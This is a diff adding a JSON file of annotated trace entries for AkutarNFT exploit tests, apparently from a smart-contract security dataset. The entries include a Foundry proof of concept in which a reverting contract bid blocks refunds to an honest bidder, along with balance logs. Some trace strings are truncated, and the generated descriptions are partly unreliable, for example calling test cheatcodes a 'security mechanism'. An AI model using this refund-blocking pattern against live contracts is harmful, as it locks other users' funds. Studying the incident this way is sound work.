@@ -1,0 +1,107 @@
+[
+    {
+        "id": "502009",
+        "args": "",
+        "original_code": "    function testDOSAttack() public {\n        address honestUser = 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4;\n        address maliciousUser = address(this); // malicious User is a contract address\n\n        cheats.prank(maliciousUser); //maliciousUser makes a bid\n        akutarNft.bid{value: 3.5 ether}(1);\n        console.log(\"honestUser Balance before Bid: \", honestUser.balance / 1 ether);\n\n        cheats.prank(honestUser); //honestUser makes a bid\n        akutarNft.bid{value: 3.75 ether}(1);\n        console.log(\"honestUser Balance after Bid: \", honestUser.balance / 1 ether);\n\n        //Set the block.height to the time when the auction was over and processRefunds() can be invoked\n        //https://etherscan.io/tx/0x62d280abc60f8b604175ab24896c989e6092e496ac01f2f5399b2a62e9feaacf\n        //use - https://www.epochconverter.com/ for UTC <-> epoch\n        cheats.warp(1_650_674_809);\n\n        cheats.prank(maliciousUser);\n        try akutarNft.processRefunds() {}\n        catch Error(string memory Exception) {\n            console.log(\"processRefunds() REVERT : \", Exception);\n        }\n        //Since the honestUser's bid was after maliciousUser's bid, the bid amount of the honestUser is never returned due to the revert Exception\n        console.log(\"honestUser Balance post processRefunds: \", honestUser.balance / 1 ether);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function simulates a Denial-of-Service (DOS) attack scenario in an NFT auction. It involves two users: an honest user and a malicious user. The malicious user places a bid first, followed by the honest user. After the auction ends, the function attempts to process refunds. However, due to a revert exception triggered by the malicious user, the honest user's bid amount is never refunded, demonstrating how a DOS attack can disrupt normal operations.\n\n2. **Security mechanism:**  \n   The function uses a testing framework (`cheats.prank` and `cheats.warp`) to simulate user actions and manipulate block timestamps. This helps in testing how the system behaves under specific conditions. The `try-catch` block is used to handle exceptions during the refund process, ensuring that the function doesn't fail entirely if an error occurs. These mechanisms are primarily for testing purposes and not for production-level security.\n\n3. **Parameter Function:**  \n   The function does not take any external parameters. However, it internally uses `address` variables to represent the honest user and the malicious user. The `value` parameter in the `bid` function specifies the amount of Ether sent with the bid. The `warp` function parameter sets the block timestamp to simulate the end of the auction.\n\n4. **Return description:**  \n   The function does not return any value. Instead, it logs the balance of the honest user at different stages (before the bid, after the bid, and after attempting to process refunds) to the console. This helps in observing how the balance changes and how the DOS attack affects the honest user's funds.\n\n**In summary,**  \nThis function demonstrates a DOS attack in an NFT auction scenario. It uses testing tools to simulate user actions and block timestamps, showing how a malicious user can prevent an honest user from receiving a refund. The function logs the honest user's balance changes to highlight the impact of the attack.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "AkutarNFTExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"honestUser Balance before Bid: \", 4",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"honestUser Balance after Bid: \", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "1650674809 [1.65e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "AkutarNFTExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "377470",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"processRefunds(",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"honestUser Balance post processRefunds: \", 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24527",
+        "args": "",
+        "original_code": "    function testclaimProjectFunds() public {\n        address ownerOfAkutarNFT = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;\n\n        //Set the block.height to the time when the auction was over and claimProjectFunds() can be invoked\n        cheats.warp(1_650_672_435);\n\n        cheats.prank(ownerOfAkutarNFT);\n        try akutarNft.claimProjectFunds() {}\n        catch Error(string memory Exception) {\n            console.log(\"claimProjectFunds() ERROR : \", Exception);\n        }\n",
+        "description": "1. Core functions:  \nThe `testclaimProjectFunds` function is designed to simulate and test the process of claiming funds from a project associated with an NFT. It sets up a specific scenario where the owner of an NFT attempts to claim the funds after a certain block height (simulated time) has been reached. The function also includes error handling to log any issues that might occur during the claim process.\n\n2. Security mechanism:  \nThe function uses a few key security measures:  \n- **`cheats.warp`**: This simulates a specific block height, ensuring the function is tested under controlled conditions.  \n- **`cheats.prank`**: This allows the function to impersonate the NFT owner, ensuring the claim is tested from the correct user's perspective.  \n- **Error handling**: The `try-catch` block captures and logs any errors that occur during the claim process, making it easier to debug issues.\n\n3. Parameter Function:  \nThe function does not take any parameters. Instead, it uses predefined values:  \n- `ownerOfAkutarNFT`: A hardcoded address representing the owner of the NFT.  \n- `1_650_672_435`: A simulated block height to test the claim process at a specific time.\n\n4. Return description:  \nThe function does not return any value. Its purpose is to test the `claimProjectFunds` function and log any errors that occur during the process. The output is a log message in the console, either confirming the success of the claim or detailing any errors encountered.\n\nIn summary,  \nThe `testclaimProjectFunds` function simulates the process of an NFT owner claiming project funds after a specific block height. It uses controlled conditions and error handling to ensure the claim process works as expected and logs any issues for debugging.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "1650672435 [1.65e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8785",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": null
+    },
+    {
+        "id": "0",
+        "args": "\"claimProjectFunds(",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
